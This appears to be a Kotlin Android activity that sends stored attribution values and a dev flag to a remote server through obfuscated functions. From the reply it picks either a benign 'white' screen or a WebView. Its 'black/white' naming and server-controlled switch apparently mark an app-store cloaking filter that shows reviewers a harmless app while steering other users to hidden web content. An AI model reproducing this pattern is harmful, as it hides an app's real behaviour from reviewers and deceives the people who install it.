package com.mobirate.rubyblack

import android.content.Intent
import android.os.Bundle
import android.util.Log
import androidx.appcompat.app.AppCompatActivity
import com.mobirate.R
import com.mobirate.rubyblack.RUBYCONST.C1
import com.mobirate.rubyblack.RUBYCONST.D1
import com.mobirate.rubyblack.RUBYCONST.DEV
import com.mobirate.rubywhite.MainRubyScreen
import com.orhanobut.hawk.Hawk
import kotlinx.android.synthetic.main.activity_filt.*
import kotlinx.coroutines.*
import java.net.HttpURLConnection
import java.net.URL

class RubyFilt : AppCompatActivity() {
    lateinit var jsoup: String

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_filt)

        jsoup = ""

        val job = GlobalScope.launch(Dispatchers.IO) {
            jsoup = sosidwiqdiqw()
            Log.d("jsoup status from global scope", jsoup)
        }

        runBlocking {
            try {
                job.join()

                Log.d("jsoup status out of global scope", jsoup)
                txtMain.text = jsoup

                if (jsoup == RUBYCONST.jsoupCheck) {
                    Intent(applicationContext, MainRubyScreen::class.java).also { startActivity(it) }
                } else {
                    Intent(applicationContext, RubyWeb::class.java).also { startActivity(it) }
                }
                finish()
            } catch (e: Exception) {

            }
        }

    }

    private suspend fun sosidwiqdiqw(): String {
        val hawk: String? = Hawk.get(C1, "null")
        val hawkAppLink: String? = Hawk.get(D1, "null")
        val hawkDevOrNot: String? = Hawk.get(DEV, "false")


        //added devModeCheck
        val forJsoupSetNaming: String = RUBYCONST.lru + RUBYCONST.odone + hawk + "&" + RUBYCONST.twoSub + hawkDevOrNot
        val forJsoupSetAppLnk: String = RUBYCONST.lru + RUBYCONST.odone + hawkAppLink + "&" +  RUBYCONST.twoSub + hawkDevOrNot

        withContext(Dispatchers.IO) {
            //changed logical null to string null
            if (hawk != "null") {
                xbhshhwqdqwd(forJsoupSetNaming)
                Log.d("Check1C", forJsoupSetNaming)
            } else {
                xbhshhwqdqwd(forJsoupSetAppLnk)
                Log.d("Check1C", forJsoupSetAppLnk)
            }
        }
        return jsoup
    }

    private fun xbhshhwqdqwd(link: String) {
        val url = URL(link)
        val urlConnection = url.openConnection() as HttpURLConnection

        try {
            val text = urlConnection.inputStream.bufferedReader().readText()
            if (text.isNotEmpty()) {
                Log.d("jsoup status inside Url function", text)
                jsoup = text
            } else {
                Log.d("jsoup status inside Url function", "is null")
            }
        } catch (ex: Exception) {

        } finally {
            urlConnection.disconnect()
        }
    }
}